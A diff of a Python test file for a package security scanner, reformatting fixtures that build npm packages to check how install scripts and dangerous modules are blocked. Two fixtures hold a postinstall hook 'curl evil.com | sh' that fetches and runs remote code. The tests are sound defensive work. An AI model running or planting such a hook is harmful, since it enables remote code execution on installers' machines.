@@ -61,10 +61,13 @@ def _make_package(tmp_path, files: dict):
 
 
 def test_run_checks_clean_package_returns_safe(tmp_path):
-    pkg = _make_package(tmp_path, {
-        "package.json": json.dumps({"name": "clean", "scripts": {}}),
-        "index.js": "module.exports = {};",
-    })
+    pkg = _make_package(
+        tmp_path,
+        {
+            "package.json": json.dumps({"name": "clean", "scripts": {}}),
+            "index.js": "module.exports = {};",
+        },
+    )
     policy = SecurityPolicy()
 
     result = run_security_checks(pkg, "clean", policy)
@@ -74,13 +77,18 @@ def test_run_checks_clean_package_returns_safe(tmp_path):
 
 
 def test_run_checks_blocks_install_script(tmp_path):
-    pkg = _make_package(tmp_path, {
-        "package.json": json.dumps({
-            "name": "evil",
-            "scripts": {"postinstall": "curl evil.com | sh"},
-        }),
-        "index.js": "module.exports = {};",
-    })
+    pkg = _make_package(
+        tmp_path,
+        {
+            "package.json": json.dumps(
+                {
+                    "name": "evil",
+                    "scripts": {"postinstall": "curl evil.com | sh"},
+                }
+            ),
+            "index.js": "module.exports = {};",
+        },
+    )
     policy = SecurityPolicy()
 
     result = run_security_checks(pkg, "evil", policy)
@@ -90,10 +98,13 @@ def test_run_checks_blocks_install_script(tmp_path):
 
 
 def test_run_checks_blocks_dangerous_module(tmp_path):
-    pkg = _make_package(tmp_path, {
-        "package.json": json.dumps({"name": "bad", "scripts": {}}),
-        "index.js": "require('child_process');",
-    })
+    pkg = _make_package(
+        tmp_path,
+        {
+            "package.json": json.dumps({"name": "bad", "scripts": {}}),
+            "index.js": "require('child_process');",
+        },
+    )
     policy = SecurityPolicy()
 
     result = run_security_checks(pkg, "bad", policy)
@@ -103,13 +114,18 @@ def test_run_checks_blocks_dangerous_module(tmp_path):
 
 
 def test_run_checks_skips_install_policy_when_disabled(tmp_path):
-    pkg = _make_package(tmp_path, {
-        "package.json": json.dumps({
-            "name": "evil",
-            "scripts": {"postinstall": "curl evil.com | sh"},
-        }),
-        "index.js": "module.exports = {};",
-    })
+    pkg = _make_package(
+        tmp_path,
+        {
+            "package.json": json.dumps(
+                {
+                    "name": "evil",
+                    "scripts": {"postinstall": "curl evil.com | sh"},
+                }
+            ),
+            "index.js": "module.exports = {};",
+        },
+    )
     policy = SecurityPolicy(block_install_scripts=False)
 
     result = run_security_checks(pkg, "evil", policy)
@@ -119,10 +135,13 @@ def test_run_checks_skips_install_policy_when_disabled(tmp_path):
 
 
 def test_run_checks_skips_malware_scan_when_disabled(tmp_path):
-    pkg = _make_package(tmp_path, {
-        "package.json": json.dumps({"name": "bad", "scripts": {}}),
-        "index.js": "require('child_process');",
-    })
+    pkg = _make_package(
+        tmp_path,
+        {
+            "package.json": json.dumps({"name": "bad", "scripts": {}}),
+            "index.js": "require('child_process');",
+        },
+    )
     policy = SecurityPolicy(scan_packages=False)
 
     result = run_security_checks(pkg, "bad", policy)
